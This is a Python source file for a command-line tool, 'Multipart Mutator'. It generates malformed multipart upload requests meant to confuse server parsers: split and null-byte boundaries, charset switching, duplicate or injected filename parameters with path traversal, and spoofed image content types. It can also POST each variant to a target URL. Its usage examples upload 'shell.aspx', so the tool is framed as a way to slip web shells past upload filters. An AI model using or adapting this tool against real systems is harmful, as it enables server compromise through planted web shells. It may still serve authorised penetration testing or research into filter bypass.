#!/usr/bin/env python3
"""
Multipart Mutator — generate parser-confusion variants of a multipart upload.


Usage:
  tools/multipart_mutator.py --file ./shell.aspx --field file
  tools/multipart_mutator.py --file ./shell.aspx --field file --out-dir /tmp/mm
  tools/multipart_mutator.py --file ./shell.aspx --field file \
    --url https://target/upload --send
  tools/multipart_mutator.py --file ./shell.aspx --field file \
    --techniques boundary-simple,double-boundary,charset-utf16le
"""
import sys
import os
import json
import argparse
import urllib.request
import urllib.error
from pathlib import Path


CRLF = b"\r\n"
LF = b"\n"


def _part_headers(field: str, filename: str, content_type: str = "application/octet-stream") -> bytes:
    return (
        f'Content-Disposition: form-data; name="{field}"; filename="{filename}"\r\n'
        f'Content-Type: {content_type}\r\n'
        f'\r\n'
    ).encode()


def boundary_simplify(file_bytes: bytes, filename: str, field: str) -> tuple[bytes, str]:
    bnd = "x"
    body = (
        f"--{bnd}\r\n".encode() +
        _part_headers(field, filename) +
        file_bytes + CRLF +
        f"--{bnd}--\r\n".encode()
    )
    ct = f"multipart/form-data; boundary={bnd}"
    return body, ct


def double_boundary(file_bytes: bytes, filename: str, field: str) -> tuple[bytes, str]:
    outer = "x"
    inner = "y"
    body = (
        f"--{outer}\r\n".encode() +
        f'Content-Disposition: form-data; name="dummy"\r\n\r\n1\r\n'.encode() +
        f"--{outer}\r\n".encode() +
        f"--{inner}\r\n".encode() +
        _part_headers(field, filename) +
        file_bytes + CRLF +
        f"--{inner}--\r\n".encode() +
        f"--{outer}--\r\n".encode()
    )
    ct = f"multipart/form-data; boundary={outer}; BOUNDARY={inner}"
    return body, ct


def charset_utf16le(file_bytes: bytes, filename: str, field: str) -> tuple[bytes, str]:
    bnd = "bound"
    try:
        text_payload = file_bytes.decode("utf-8", errors="replace")
    except Exception:
        text_payload = file_bytes.decode("latin-1", errors="replace")
    utf16_bytes = text_payload.encode("utf-16-le")
    body = (
        f"--{bnd}\r\n".encode() +
        f'Content-Disposition: form-data; name="{field}"; filename="{filename}"\r\n'.encode() +
        f"Content-Type: text/plain; charset=utf-16le\r\n\r\n".encode() +
        utf16_bytes + CRLF +
        f"--{bnd}--\r\n".encode()
    )
    ct = f"multipart/form-data; boundary={bnd}"
    return body, ct


def null_byte_in_boundary(file_bytes: bytes, filename: str, field: str) -> tuple[bytes, str]:
    bnd = "x"
    null_bnd = bnd + "\x00"
    body = (
        f"--{null_bnd}\r\n".encode("latin-1") +
        _part_headers(field, filename) +
        file_bytes + CRLF +
        f"--{null_bnd}--\r\n".encode("latin-1")
    )
    ct = f"multipart/form-data; boundary={bnd}"
    return body, ct


def disposition_subparam_injection(file_bytes: bytes, filename: str, field: str) -> tuple[bytes, str]:
    bnd = "bound"
    evil_filename = f'1;/../{filename}'
    body = (
        f"--{bnd}\r\n".encode() +
        f'Content-Disposition: form-data; name="{field}"; x=filename="{evil_filename}"\r\n'.encode() +
        f"Content-Type: application/octet-stream\r\n\r\n".encode() +
        file_bytes + CRLF +
        f"--{bnd}--\r\n".encode()
    )
    ct = f"multipart/form-data; boundary={bnd}"
    return body, ct


def post_terminator_payload(file_bytes: bytes, filename: str, field: str) -> tuple[bytes, str]:
    bnd = "bound"
    safe_part = b'Content-Disposition: form-data; name="dummy"\r\n\r\nsafe_value\r\n'
    body = (
        f"--{bnd}\r\n".encode() +
        safe_part +
        f"--{bnd}--\r\n".encode() +
        f"--{bnd}\r\n".encode() +
        _part_headers(field, filename) +
        file_bytes + CRLF +
        f"--{bnd}--\r\n".encode()
    )
    ct = f"multipart/form-data; boundary={bnd}"
    return body, ct


def per_part_image_type(file_bytes: bytes, filename: str, field: str) -> tuple[bytes, str]:
    bnd = "bound"
    body = (
        f"--{bnd}\r\n".encode() +
        f'Content-Disposition: form-data; name="{field}"; filename="{filename}"\r\n'.encode() +
        f"Content-Type: image/jpeg\r\n\r\n".encode() +
        file_bytes + CRLF +
        f"--{bnd}--\r\n".encode()
    )
    ct = f"multipart/form-data; boundary={bnd}"
    return body, ct


def crlf_lf_mix(file_bytes: bytes, filename: str, field: str) -> tuple[bytes, str]:
    bnd = "bound"
    body = (
        f"--{bnd}\n".encode() +
        f'Content-Disposition: form-data; name="{field}"; filename="{filename}"\n'.encode() +
        f"Content-Type: application/octet-stream\n\n".encode() +
        file_bytes + LF +
        f"--{bnd}--\n".encode()
    )
    ct = f"multipart/form-data; boundary={bnd}"
    return body, ct


def leading_whitespace_boundary(file_bytes: bytes, filename: str, field: str) -> tuple[bytes, str]:
    bnd = "  x"
    body = (
        f"--{bnd}\r\n".encode() +
        _part_headers(field, filename) +
        file_bytes + CRLF +
        f"--{bnd}--\r\n".encode()
    )
    ct = f"multipart/form-data; boundary={bnd.strip()}"
    return body, ct


def duplicate_filename_param(file_bytes: bytes, filename: str, field: str) -> tuple[bytes, str]:
    bnd = "bound"
    safe_name = "safe.txt"
    body = (
        f"--{bnd}\r\n".encode() +
        f'Content-Disposition: form-data; name="{field}"; filename="{safe_name}"; filename="{filename}"\r\n'.encode() +
        f"Content-Type: application/octet-stream\r\n\r\n".encode() +
        file_bytes + CRLF +
        f"--{bnd}--\r\n".encode()
    )
    ct = f"multipart/form-data; boundary={bnd}"
    return body, ct


TECHNIQUES = {
    "boundary-simple": boundary_simplify,
    "double-boundary": double_boundary,
    "charset-utf16le": charset_utf16le,
    "null-byte-boundary": null_byte_in_boundary,
    "disposition-subparam": disposition_subparam_injection,
    "post-terminator": post_terminator_payload,
    "per-part-image-type": per_part_image_type,
    "crlf-lf-mix": crlf_lf_mix,
    "leading-whitespace-boundary": leading_whitespace_boundary,
    "duplicate-filename": duplicate_filename_param,
}


def send_request(url: str, body: bytes, content_type: str) -> dict:
    req = urllib.request.Request(url, data=body, method="POST")
    req.add_header("Content-Type", content_type)
    req.add_header("User-Agent", "Mozilla/5.0")
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            return {"status": resp.status, "length": len(resp.read())}
    except urllib.error.HTTPError as e:
        return {"status": e.code, "length": 0}
    except Exception as ex:
        return {"status": 0, "error": str(ex), "length": 0}


def main():
    parser = argparse.ArgumentParser(description="Multipart Mutator")
    parser.add_argument("--file", required=True, help="File to upload")
    parser.add_argument("--field", required=True, help="Form field name")
    parser.add_argument("--techniques", default="all",
                        help=f"Comma-separated techniques or 'all'. Available: {','.join(TECHNIQUES)}")
    parser.add_argument("--out-dir", default="./multipart_variants", help="Output directory")
    parser.add_argument("--url", help="Target URL (required for --send)")
    parser.add_argument("--send", action="store_true", help="POST each variant to --url")
    args = parser.parse_args()

    if args.send and not args.url:
        print("ERROR: --send requires --url", file=sys.stderr)
        sys.exit(1)

    file_path = Path(args.file)
    if not file_path.exists():
        print(f"ERROR: file not found: {args.file}", file=sys.stderr)
        sys.exit(1)

    file_bytes = file_path.read_bytes()
    filename = file_path.name
    out_dir = Path(args.out_dir)
    out_dir.mkdir(parents=True, exist_ok=True)

    if args.techniques == "all":
        selected = list(TECHNIQUES.keys())
    else:
        selected = [t.strip() for t in args.techniques.split(",")]
        for t in selected:
            if t not in TECHNIQUES:
                print(f"ERROR: unknown technique '{t}'. Available: {','.join(TECHNIQUES)}", file=sys.stderr)
                sys.exit(1)

    results = []
    for tech in selected:
        fn = TECHNIQUES[tech]
        try:
            body, ct = fn(file_bytes, filename, args.field)
        except Exception as e:
            print(f"[{tech}] generation error: {e}", file=sys.stderr)
            continue

        raw_path = out_dir / f"{tech}.raw"
        meta_path = out_dir / f"{tech}.meta.json"
        raw_path.write_bytes(body)
        meta = {"technique": tech, "content_type": ct, "body_bytes": len(body)}
        meta_path.write_text(json.dumps(meta, indent=2))
        print(f"[{tech}]  body={len(body)}B  CT={ct}")

        if args.send:
            result = send_request(args.url, body, ct)
            result["technique"] = tech
            results.append(result)
            status_str = str(result.get("status", "?"))
            print(f"  → HTTP {status_str}  len={result.get('length', 0)}")

    if results:
        results_path = out_dir / "results.json"
        results_path.write_text(json.dumps(results, indent=2))
        print(f"\nResults: {results_path}")

    print(f"\nVariants written to: {out_dir}/")


if __name__ == "__main__":
    main()
